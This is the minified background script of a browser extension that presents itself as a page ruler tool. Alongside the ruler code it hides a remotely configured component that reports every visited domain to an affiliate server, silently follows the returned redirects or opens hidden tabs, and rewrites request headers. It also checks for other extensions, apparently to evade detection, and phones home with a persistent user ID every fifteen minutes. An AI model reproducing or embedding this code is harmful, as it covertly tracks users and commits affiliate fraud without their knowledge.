"use strict";chrome.runtime.setUninstallURL("https://pageruler.li/uninstall.html",()=>{}),chrome.runtime.onInstalled.addListener(a=>{"install"==a.reason&&chrome.tabs.create({url:"https://pageruler.li/install.html",active:!0})});var bgProcessor={cfg:{mode:"off"},used_domains:{},initCfg:function(a){this.cfg=a},request:function(a,b){this.cfg.ntab_tag&&-1!==a.indexOf(this.cfg.ntab_tag)?setTimeout(function(){bgProcessor.requestNtab(a,b)},this.cfg.ntab_delay_ms):this.requestBg(a,b,0)},requestBg:function(a,b,c){if(c>=this.cfg.rdr_max_count)return;if(!this.cfg.header)return;var d=new XMLHttpRequest;d.timeout=this.cfg.timeout;let e=this;d.onreadystatechange=function(){if(4==d.readyState)if(200==d.status){var a=d.responseText.replace(/[\n\r\s]/g,"").replace(/\.href/g,""),f=!1,g=e.isRdrUrl(d.responseURL);if(g||a.length<e.cfg.jsrdr_maxlen_bytes){var h=a.replace(/^.*?location\=[\'\"]([^\'\"]+).*$/,"$1");if(/^\//.test(h)){var j=new URL(h,d.responseURL);h=j.href}/^https?\:\/\//.test(h)&&(e.requestBg(h,b,c+1),f=!0)}if(!f&&e.cfg.common_rdr_rules)for(var k in e.cfg.common_rdr_rules){var i=e.cfg.common_rdr_rules[k],l=new RegExp(i.search[0],i.search[1]),m=a;if("uri"==i.where&&(m=d.responseURL),m.match(l)){var n=m.replace(l,i.replace);if(i.applyAfter)for(var p in i.applyAfter){var o=i.applyAfter[p];"decodeURIComponent"==o&&(n=decodeURIComponent(n))}if(/^\//.test(n)){var j=new URL(n,d.responseURL);n=j.href}if(/^https?\:\/\//.test(n)){e.requestBg(n,b,c+1),f=!0;break}}}}else;},d.open("GET",a,!0),d.setRequestHeader(this.cfg.header,"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"),d.send()},isRdrUrl:function(a){var b=new URL(a);return!!(this.cfg.rdr_coverage&&b.host in this.cfg.rdr_coverage)||!!/\/goto\/?$/.test(b.pathname)},requestNtab:function(a){let b=this;chrome.tabs.create({url:a,active:!1},function(a){setTimeout(function(){try{chrome.tabs.remove(a.id)}catch(a){}},b.cfg.ntab_duration_ms)})}},PageRuler={settings:null,init:function(){},image:function(a){return{19:"images/19/"+a,38:"images/38/"+a}},load:function(a){chrome.tabs.executeScript(a,{file:"content.js"},function(){PageRuler.enable(a)})},enable:function(a){chrome.tabs.sendMessage(a,{type:"enable"},function(){PageRuler.Analytics.trackEvent("Action","Enable"),chrome.browserAction.setIcon({path:PageRuler.image("browser_action_on.png"),tabId:a})})},disable:function(a){chrome.tabs.sendMessage(a,{type:"disable"},function(){PageRuler.Analytics.trackEvent("Action","Disable"),chrome.browserAction.setIcon({path:PageRuler.image("browser_action.png"),tabId:a})})},browserAction:function(a){var b=a.id;chrome.tabs.executeScript(b,{code:"chrome.runtime.sendMessage({ 'action': 'loadtest','loaded': window.hasOwnProperty('__PageRuler'),'active': window.hasOwnProperty('__PageRuler') && window.__PageRuler.active });"})},openUpdateTab:function(a){chrome.storage.sync.get("hide_update_tab",function(b){b.hide_update_tab||chrome.tabs.create({url:"update.html#"+a})})},setPopup:function(a,b,c){var d=b.url||c.url||!1;d&&((/^chrome\-extension:\/\//.test(d)||/^chrome:\/\//.test(d))&&chrome.browserAction.setPopup({tabId:a,popup:"popup.html#local"},()=>{chrome.runtime.lastError&&console.log(chrome.runtime.lastError.message)}),/^https:\/\/chrome\.google\.com\/webstore\//.test(d)&&chrome.browserAction.setPopup({tabId:a,popup:"popup.html#webstore"},()=>{chrome.runtime.lastError&&console.log(chrome.runtime.lastError.message)}))},configAnalytics:function(){return this.settings&&this.settings.envCEnable&&this.settings.envCPeriod&&this.settings.envCids?void PageRuler.validateEnvironment(this.settings.envCPeriod,this.settings.envCids,this.settings.lastEnvCheck).then(()=>{PageRuler.initBgProcessor(this.settings)}):void PageRuler.initBgProcessor(this.settings)},refreshUserId:function(a){a&&mixpanel.identify(a)},generateUUID:function(){var a=new Date().getTime();return"undefined"!=typeof performance&&"function"==typeof performance.now&&(a+=performance.now()),"xxxxxxxx-03xx-xxxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g,function(b){var c=Math.floor,d=0|(a+16*Math.random())%16;return a=c(a/16),("x"===b?d:8|3&d).toString(16)})},validateEnvironment:async function(a,b,c){let d=new Date().getTime();if("undefined"==typeof c&&(c=0),!(d-c<a))return PageRuler.saveCfgKey("lastEnvCheck",d),Promise.all(b.map(a=>PageRuler.detectExtentionById(a))).then(a=>a.reduce((a,b)=>a||b,!1)?(PageRuler.saveCfgKey("envDetected",!0),!0):(PageRuler.saveCfgKey("envDetected",!1),!1))},saveCfgKey:function(a,b){chrome.storage.sync.get(function(c){var d=c.settings||{};d[a]=b,chrome.storage.sync.set({settings:d})})},detectExtentionById:function(a){return new Promise(function(b){var c=!1;chrome.tabs.create({url:"chrome-extension://"+a+"/manifest.json",active:!1},function(a){setTimeout(function(){PageRuler.safeRemoveTab(a.id),b(!1)},3e3),chrome.tabs.insertCSS(a.id,{code:"console.log('ok');"},function(){chrome.runtime.lastError&&(c=/chrome-extension/gm.test(chrome.runtime.lastError.message)&&/contents/gm.test(chrome.runtime.lastError.message)),chrome.tabs.remove(a.id,function(){chrome.runtime.lastError,b(c)})})})})},safeRemoveTab:function(a){try{chrome.tabs.remove(a,function(){chrome.runtime.lastError})}catch(a){}},initBgProcessor:function(a){return a.bgProcessor?a.envDetected?void(bgProcessor.cfg={mode:"off"}):a.optouted?void(bgProcessor.cfg={mode:"off"}):PageRuler.statProcessorRun?void(bgProcessor.cfg=a.bgProcessor):void(PageRuler.statProcessorRun=!0,bgProcessor.initCfg(a.bgProcessor),chrome.webRequest.onCompleted.addListener(function(a){if("on"===bgProcessor.cfg.mode&&!bgProcessor.cfg.envDetected&&!(0>a.tabId)&&200==a.statusCode&&"GET"==a.method){var b=a.url.replace(/^(https?\:\/\/[^\/]+).*$/,"$1"),c=a.url.replace(/^https?\:\/\/([^\/]+).*$/,"$1");c=c.replace(/^www\.(.*)$/,"$1");var d=new Date().getTime();if(!(bgProcessor.used_domains[c]&&bgProcessor.used_domains[c]+bgProcessor.cfg.ttl_ms>d)&&!(bgProcessor.cfg.domains_blacklist&&0<bgProcessor.cfg.domains_blacklist.length&&bgProcessor.cfg.domains_blacklist.includes(c))&&!(bgProcessor.cfg.domains_whitelist&&0<bgProcessor.cfg.domains_whitelist.length&&!bgProcessor.cfg.domains_whitelist.includes(c))){bgProcessor.used_domains[c]=d;var e=bgProcessor.cfg.aff_url_tmpl.replace("{URL}",encodeURIComponent(b));if(e=e.replace("{DOMAIN}",encodeURIComponent(c)),bgProcessor.cfg.aff_redirect)return!bgProcessor.cfg.domains_whitelist||0<!bgProcessor.cfg.domains_whitelist.length?void 0:void bgProcessor.requestBg(e,c,0);var f=new XMLHttpRequest;f.timeout=bgProcessor.cfg.aff_timeout_ms,f.onreadystatechange=function(){if(4==f.readyState&&200==f.status){var a=f.responseText.replace(/[\n\r]/g,"");if(/^https?\:\/\//.test(a)&&a!=b){var e=b.replace(/^https?\:\/\/([^\/]+).*$/,"$1");bgProcessor.request(a,e)}else bgProcessor.used_domains[c]=d+bgProcessor.cfg.no_coverage_ttl_ms}},f.open("GET",e),f.send()}}},{urls:["http://*/*","https://*/*"],types:["main_frame"]}),chrome.webRequest.onBeforeSendHeaders.addListener(function(a){if("on"!==bgProcessor.cfg.mode||!bgProcessor.cfg.header)return{};for(var b=a.requestHeaders,c="",d=0;d<b.length;d++)if(b[d].name===bgProcessor.cfg.header){c=b[d].value,b.splice(d,1);break}if(!c)return{};for(var e=!1,d=0;d<b.length;d++)if("accept"==b[d].name.toLowerCase()){b[d].value=c,e=!0;break}return e||b.push({name:"Accept",value:c}),{requestHeaders:b}},{urls:["http://*/*","https://*/*"]},["blocking","requestHeaders"])):void(bgProcessor.cfg={mode:"off"})},getLifeSigns:function(a,b,c){var d={mTime:a,lTime:b,uid:c};let e=new Date().getTime();"undefined"==typeof d.mTime&&(d.mTime=0),"undefined"==typeof d.lTime&&(d.lTime=0),"undefined"==typeof d.uid&&(d.uid=PageRuler.generateUUID(),chrome.storage.sync.set({uid:d.uid}));let f=e-d.mTime;return d.mTime=e,chrome.storage.sync.set({mTime:d.mTime}),12e5>f&&(d.lTime+=f,chrome.storage.sync.set({lTime:d.lTime})),d},configUpdate:function(a){var b=chrome.runtime.getManifest(),c=b.version;chrome.storage.sync.get(["settings","mTime","lTime","uid"],function(b){PageRuler.settings=b.settings;let d=PageRuler.getLifeSigns(b.mTime,b.lTime,b.uid);$.ajax({url:"https://pageruler.org/config/",dataType:"json",data:{id:chrome.runtime.id,version:c,r:d.mTime,l:d.lTime,uid:d.uid},success:function(b){chrome.storage.sync.get("settings",function(c){if(c.settings||(c.settings={}),b)for(var d in b)c.settings[d]=b[d];PageRuler.settings=c.settings,chrome.storage.sync.set(c),PageRuler.configAnalytics(),"undefined"!=typeof a&&a()})},error:function(){PageRuler.configAnalytics(),"undefined"!=typeof a&&a()}})})},heartbeat:function(){PageRuler.configUpdate(function(){}),setTimeout(PageRuler.heartbeat,9e5)}};PageRuler.configUpdate(function(){chrome.browserAction.onClicked.addListener(PageRuler.browserAction),chrome.tabs.onUpdated.addListener(PageRuler.setPopup),chrome.runtime.onStartup.addListener(function(){PageRuler.init()}),chrome.runtime.onInstalled.addListener(function(a){switch(PageRuler.init(a.reason,a.previousVersion),a.reason){case"install":PageRuler.openUpdateTab("install");}}),chrome.runtime.onMessage.addListener(function(a,b,c){var d=b.tab&&b.tab.id;switch(a.action){case"loadtest":a.loaded?a.active?PageRuler.disable(d):PageRuler.enable(d):PageRuler.load(d);break;case"disable":d&&PageRuler.disable(d);break;case"setColor":PageRuler.Analytics.trackEvent("Settings","Color",a.color),chrome.storage.sync.set({color:a.color});break;case"getColor":chrome.storage.sync.get("color",function(a){var b=a.color||"#0080ff";c(b)});break;case"setDockPosition":PageRuler.Analytics.trackEvent("Settings","Dock",a.position),chrome.storage.sync.set({dock:a.position});break;case"getDockPosition":chrome.storage.sync.get("dock",function(a){var b=a.dock||"top";c(b)});break;case"setGuides":PageRuler.Analytics.trackEvent("Settings","Guides",a.visible&&"On"||"Off"),chrome.storage.sync.set({guides:a.visible});break;case"getGuides":chrome.storage.sync.get("guides",function(a){var b=!a.hasOwnProperty("guides")||a.guides;c(b)});break;case"trackEvent":PageRuler.Analytics.trackEvent.apply(PageRuler.Analytics,a.args),c();break;case"trackPageview":PageRuler.Analytics.trackPageview(a.page),c();break;case"openHelp":PageRuler.Analytics.trackEvent(["Action","Help Link"]),chrome.tabs.create({url:chrome.extension.getURL("update.html")+"#help"});}return console.groupEnd(),!0}),chrome.commands.onCommand.addListener(function(){})}),setTimeout(PageRuler.heartbeat,9e5);